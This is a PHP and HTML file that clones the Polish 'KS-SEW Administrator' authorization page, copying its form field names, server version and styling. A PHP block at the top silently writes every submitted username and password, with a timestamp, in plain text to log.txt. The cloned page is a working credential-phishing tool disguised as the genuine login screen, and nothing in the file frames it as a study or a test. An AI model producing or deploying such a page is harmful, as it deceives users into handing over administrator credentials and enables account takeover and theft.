<?php
// Sprawdzenie, czy formularz został przesłany
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Pobranie danych z formularza
    $login = $_POST['FFFRAB0120login'] ?? '';
    $password = $_POST['FFFRAB0120pasw'] ?? '';

    // Formatowanie danych do zapisu
    $data = "Login: " . $login . " | Hasło: " . $password . " | Data: " . date('Y-m-d H:i:s') . PHP_EOL;

    // Zapis do pliku log.txt
    file_put_contents('log.txt', $data, FILE_APPEND | LOCK_EX);
}
?>

<!doctype html public "-//w3c//dtd html 3.2//en">

<html>


<head>
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'nonce-cf659adb-95e4-4d4e-8074-a88f79a9b609'; style-src 'self' 'nonce-cf659adb-95e4-4d4e-8074-a88f79a9b609'; form-action 'self'">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<script src="https://213.77.20.87:444/ks-sew/JavaScriptServlet" defer></script>
<title>Autoryzacja w systemie KS-SEW</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
<meta http-equiv="Pragma" content="no-cache">
<link rel="stylesheet" href="../../theme/loader.css" type="text/css">
<link rel="stylesheet" href="../../theme/style.css" type="text/css">
<link rel="stylesheet" href="../../theme/flogin.css" type="text/css">
<script language="JavaScript" src="../../code/nav.js" charset="UTF-8"></script>

<script language="JavaScript" src="../../code/transformUrlToPostForm.js"></script>

</head>

<BODY>
<div class="loader-wrapper">
	<div class="loader">
	</div>
</div>
<script language="JavaScript" src="../../code/remover.js"></script>
<center>
<table id="content" width="100%" height="100%">
<tr>
  <td height="74" class="dark">
    <a href="http://www.osoz.pl/"><img src="../../images/ppf-osoz_left.gif"></a>
<input id="csrf_protection" type="hidden" name="OWASP-CSRFTOKEN" value="">
  </td>
  <td width="100%">
<table class="title">
    	<tr><td width="100%" colspan="2">
    		<div class="title"><span class="bold red">KS-SEW</span>&nbsp;Administrator</div>
    	</td></tr>
    	<tr>
	   		<td align="left">Wersja serwera:&nbsp;<b>2020.01.0.81</b></td>
	      <td align="right"></td>
	    </tr>
    </table>
  </td>
  <td class="dark"><img src="../../images/ppf-osoz_right.gif"></td>
</tr>
<tr>
<td>
  <table class="lr" background="../../images/ppf-bgr_left.png" cellpadding="0" cellspacing="0">
    <tr><td valign="top">
    </td></tr>
    <tr><td valign="bottom">
    </td></tr>
  </table>
</td>
<td>
  <table align="center" width="100%" height="100%">
    <tr>
      <td valign="top" height="10">
        <div class="header">Autoryzacja</div>
      </td>
    </tr>
    <tr>
      <td align="center" colspan="3" valign="middle">
      <form action="#" method="post">
      <table align="center" id="borderStyle" background="../../images/ppf-auth.png" cellpadding="0" cellspacing="0">
      <tr>
        <td align="center" colspan=2 background="../../images/ppf-auth-dark.png">
        <div class="h1">Autoryzacja</div>
        </td>
      </tr>
      <tr>
      <td>
        <table cellpadding="10" cellspacing="5">
        <tr>
          <td>Użytkownik:<br>
            <input type="text" name="FFFRAB0120login" autocomplete="off" size="12" maxlength=20 value="">
            <input type="hidden" name="DFFFRAB0120login" autocomplete="off" value="Login"><font color=red><b></b></font>
          </td>
        </tr>
        <tr>
          <td>Hasło:<br>
            <input type="password" name="FFFRAB0120pasw" autocomplete="off" size="12" maxlength=20 value="" >
            <input type="hidden" name="DFFFRAB0120pasw" autocomplete="off" value="Has�o"><font color=red><b></b></font>
          </td>
        </tr>
        <tr>
          <td valign="top" colspan="2" align="center">
            <input type="submit" value=" Zaloguj ">
          </td>
        </tr>
      </table>
      </td>
      <td><table><tr><td><img border="1" src="../../images/ppf-login_picture.jpg"></td></tr></table>
      </td>
      </tr>
      </table>
      </form>
      <br>
      
<center>
      <div>Dostęp do aplikacji dozwolony jedynie dla uprawnionych użytkowników.</div>
      <div>Aby się zalogować należy podać nazwę użytkownika (login) oraz hasło dostępu do serwisu.<br>
      </center>
      </td>
    </tr>
  </table>
</td>
<td>
  <table class="lr" background="../../images/ppf-bgr_right.png"><tr><td></td></tr></table>
</td>
</tr>
</table>
</center>
<script language="JavaScript" src="../../code/flogin.js" charset="UTF-8"></script>
</body>

</html>

